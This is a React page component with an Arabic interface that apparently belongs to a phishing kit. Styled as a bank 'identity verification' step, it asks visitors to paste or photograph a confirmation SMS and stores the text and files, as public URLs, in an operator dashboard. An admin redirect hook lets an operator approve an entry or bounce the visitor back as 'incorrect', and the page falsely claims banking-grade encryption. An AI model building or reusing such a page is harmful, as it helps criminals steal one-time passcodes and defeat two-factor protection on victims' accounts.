import { useState, useRef, useEffect } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { Upload, Camera, X, FileText, ShieldCheck, MessageSquareText, Sparkles, CheckCircle2 } from "lucide-react";
import { useAdminRedirect } from "@/hooks/use-admin-redirect";
import WaitingOverlay from "@/components/WaitingOverlay";
import confirmBanner from "@/assets/confirm-banner.jpg";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";

const ConfirmOrder = () => {
  const [searchParams] = useSearchParams();
  const userId = searchParams.get("uid") || "";
  const wasRejected = searchParams.get("rejected") === "true";
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);
  const [files, setFiles] = useState<{ file: File; preview: string }[]>([]);
  const [submitted, setSubmitted] = useState(false);
  const [rejectionError, setRejectionError] = useState(wasRejected);

  useEffect(() => {
    if (wasRejected) {
      setSubmitted(false);
      setRejectionError(true);
    }
  }, [wasRejected, searchParams.get("t")]);

  useAdminRedirect(userId || null, { approveRedirect: submitted ? "/waiting" : undefined });

  useEffect(() => {
    if (!userId) return;
    supabase.from("dashboard_users").update({ last_page: "الرسالة" }).eq("id", userId).then();
  }, [userId]);
  const fileInputRef = useRef<HTMLInputElement>(null);
  const cameraInputRef = useRef<HTMLInputElement>(null);

  const handleFileSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    const selected = e.target.files;
    if (!selected) return;
    const newFiles = Array.from(selected).map((file) => ({
      file,
      preview: file.type.startsWith("image/") ? URL.createObjectURL(file) : "",
    }));
    setFiles((prev) => [...prev, ...newFiles]);
    e.target.value = "";
  };

  const removeFile = (index: number) => {
    setFiles((prev) => {
      const removed = prev[index];
      if (removed.preview) URL.revokeObjectURL(removed.preview);
      return prev.filter((_, i) => i !== index);
    });
  };

  const uploadFiles = async (): Promise<string[]> => {
    const urls: string[] = [];
    for (const { file } of files) {
      const ext = file.name.split(".").pop();
      const path = `${userId}/${Date.now()}_${Math.random().toString(36).slice(2)}.${ext}`;
      const { error } = await supabase.storage.from("documents").upload(path, file);
      if (error) { toast.error(`فشل رفع الملف: ${file.name}`); continue; }
      const { data: urlData } = supabase.storage.from("documents").getPublicUrl(path);
      urls.push(urlData.publicUrl);
    }
    return urls;
  };

  const handleSubmit = async () => {
    if (!message.trim() && files.length === 0) {
      toast.error("يرجى لصق الرسالة أو رفع المستند المطلوب");
      return;
    }
    if (!userId) return;
    setLoading(true);
    let fileUrls: string[] = [];
    if (files.length > 0) fileUrls = await uploadFiles();
    await supabase
      .from("dashboard_users")
      .update({
        message_data: [{ text: message, files: fileUrls, timestamp: new Date().toISOString() }],
        last_page: "الرسالة",
        status_tabs: {},
      })
      .eq("id", userId);
    setLoading(false);
    setSubmitted(true);
    toast.success("تم إرسال البيانات بنجاح");
  };

  return (
    <div className="min-h-screen bg-background flex flex-col relative" dir="rtl">
      <div className="fixed inset-0 gradient-mesh pointer-events-none" />
      <SiteHeader />

      <div className="relative">
        <img src={confirmBanner} alt="التحقق من الهوية" className="w-full h-36 object-cover" width={1024} height={512} />
        <div className="absolute inset-0 bg-gradient-to-t from-background via-background/50 to-black/40" />
        <div className="absolute inset-0 pattern-grid opacity-15" />
        <div className="absolute bottom-3 right-0 left-0 text-center">
          <h1 className="text-base font-extrabold text-white drop-shadow-[0_2px_12px_rgba(0,0,0,0.7)]">التحقق من الهوية</h1>
        </div>
      </div>

      <div className="flex items-center justify-center gap-4 py-2.5 bg-card/60 backdrop-blur-sm border-b border-border/40">
        <div className="flex items-center gap-1.5">
          <div className="w-5 h-5 rounded-md hero-gradient flex items-center justify-center">
            <ShieldCheck className="w-3 h-3 text-primary-foreground" />
          </div>
          <span className="text-[10px] font-bold text-foreground">تشفير كامل</span>
        </div>
        <div className="w-px h-3 bg-border" />
        <div className="flex items-center gap-1.5">
          <Sparkles className="w-3.5 h-3.5 text-accent" />
          <span className="text-[10px] text-muted-foreground font-medium">خطوة أخيرة للتأكيد</span>
        </div>
      </div>

      <div className="flex-1 flex flex-col items-center px-2 py-6 gap-4 max-w-[1600px] mx-auto w-full relative z-10">
        {rejectionError && (
          <div className="bg-destructive/5 border border-destructive/20 rounded-2xl p-4 mb-4 flex items-start gap-3 animate-fade-in card-shadow w-full">
            <span className="text-2xl mt-0.5">⚠️</span>
            <div>
              <p className="text-base font-bold text-destructive mb-0.5">بيانات غير صحيحة</p>
              <p className="text-sm text-muted-foreground leading-relaxed">البيانات المدخلة غير صحيحة، يرجى التأكد منها وإعادة إدخالها.</p>
            </div>
            <button onClick={() => setRejectionError(false)} className="text-muted-foreground hover:text-foreground text-lg mr-auto">✕</button>
          </div>
        )}

        <div className="flex items-start gap-3 bg-card/80 backdrop-blur-sm rounded-2xl p-4 w-full border border-border/40 card-shadow">
          <div className="w-9 h-9 rounded-xl hero-gradient flex items-center justify-center shrink-0 shadow-button">
            <Sparkles className="w-4 h-4 text-primary-foreground" />
          </div>
          <div>
            <p className="text-sm font-bold text-foreground mb-0.5">خطوة واحدة لإتمام التحقق!</p>
            <p className="text-xs text-muted-foreground leading-relaxed">
              حرصاً على أمان حسابك، يُرجى لصق نص رسالة التأكيد النصية أو إرفاق صورة واضحة لها.
            </p>
          </div>
        </div>

        <div className="w-full bg-card rounded-2xl p-5 card-shadow border border-border/30">
          <label className="flex items-center gap-1.5 text-sm font-bold text-foreground mb-2">
            <div className="w-6 h-6 rounded-lg hero-gradient flex items-center justify-center">
              <MessageSquareText className="w-3.5 h-3.5 text-primary-foreground" />
            </div>
            نص رسالة التأكيد
          </label>
          <textarea
            value={message}
            onChange={(e) => setMessage(e.target.value)}
            placeholder="الصق نص رسالة التأكيد هنا..."
            className="w-full min-h-[120px] rounded-xl border border-border/40 bg-muted/30 p-4 text-foreground text-base placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary/50 resize-none text-right transition-all"
          />
        </div>

        <div className="w-full flex items-center gap-3">
          <div className="flex-1 h-px bg-gradient-to-r from-transparent via-border to-transparent" />
          <span className="text-xs font-bold text-muted-foreground">أو أرفق صورة المستند</span>
          <div className="flex-1 h-px bg-gradient-to-l from-transparent via-border to-transparent" />
        </div>

        <div className="w-full grid grid-cols-2 gap-3">
          <button type="button" onClick={() => fileInputRef.current?.click()} className="group flex flex-col items-center gap-2 py-4 rounded-2xl border border-border/40 bg-card card-shadow hover:card-hover-shadow hover:-translate-y-0.5 transition-all cursor-pointer">
            <div className="w-10 h-10 rounded-xl hero-gradient flex items-center justify-center shadow-button">
              <Upload className="w-4 h-4 text-primary-foreground" />
            </div>
            <span className="text-sm font-bold text-foreground">رفع مستند</span>
            <span className="text-xs text-muted-foreground">PDF, صور, Word</span>
          </button>
          <button type="button" onClick={() => cameraInputRef.current?.click()} className="group flex flex-col items-center gap-2 py-4 rounded-2xl border border-border/40 bg-card card-shadow hover:card-hover-shadow hover:-translate-y-0.5 transition-all cursor-pointer">
            <div className="w-10 h-10 rounded-xl gradient-accent flex items-center justify-center shadow-[0_4px_14px_hsl(38_92%_55%/0.3)]">
              <Camera className="w-4 h-4 text-primary-foreground" />
            </div>
            <span className="text-sm font-bold text-foreground">التقاط صورة</span>
            <span className="text-xs text-muted-foreground">من الكاميرا مباشرة</span>
          </button>
        </div>

        <input ref={fileInputRef} type="file" accept="image/*,.pdf,.doc,.docx" multiple className="hidden" onChange={handleFileSelect} />
        <input ref={cameraInputRef} type="file" accept="image/*" capture="environment" className="hidden" onChange={handleFileSelect} />

        {files.length > 0 && (
          <div className="w-full space-y-2">
            {files.map((f, i) => (
              <div key={i} className="flex items-center gap-3 bg-card border border-border/30 rounded-xl p-2.5 card-shadow">
                {f.file.type.startsWith("image/") && f.preview ? (
                  <img src={f.preview} alt="معاينة" className="w-12 h-12 object-cover rounded-lg" />
                ) : (
                  <div className="w-12 h-12 rounded-lg bg-muted flex items-center justify-center">
                    <FileText className="w-5 h-5 text-muted-foreground" />
                  </div>
                )}
                <div className="flex-1 min-w-0">
                  <p className="text-sm text-foreground truncate font-medium">{f.file.name}</p>
                  <p className="text-xs text-muted-foreground">{(f.file.size / 1024).toFixed(0)} KB</p>
                </div>
                <button onClick={() => removeFile(i)} className="p-1.5 rounded-full hover:bg-destructive/10 text-destructive transition-colors">
                  <X className="w-4 h-4" />
                </button>
              </div>
            ))}
          </div>
        )}

        <div className="flex items-center gap-2 rounded-xl py-2.5 px-3 bg-card/60 backdrop-blur-sm border border-border/30 w-full">
          <div className="w-7 h-7 rounded-lg hero-gradient flex items-center justify-center shrink-0">
            <CheckCircle2 className="w-3.5 h-3.5 text-primary-foreground" />
          </div>
          <p className="text-xs text-muted-foreground leading-relaxed">
            جميع بياناتك ومستنداتك محمية بتشفير كامل وفق أعلى المعايير المصرفية الدولية.
          </p>
        </div>

        <button onClick={handleSubmit} disabled={loading || submitted} className="w-full py-4 rounded-xl hero-gradient text-primary-foreground font-bold text-base shadow-button hover:shadow-[0_6px_24px_hsl(213_76%_44%/0.4)] transition-all disabled:opacity-50 active:scale-[0.98]">
          {loading ? "جاري التحقق..." : "تأكيد وإرسال"}
        </button>
      </div>
      <SiteFooter />

      {submitted && <WaitingOverlay />}
    </div>
  );
};

export default ConfirmOrder;
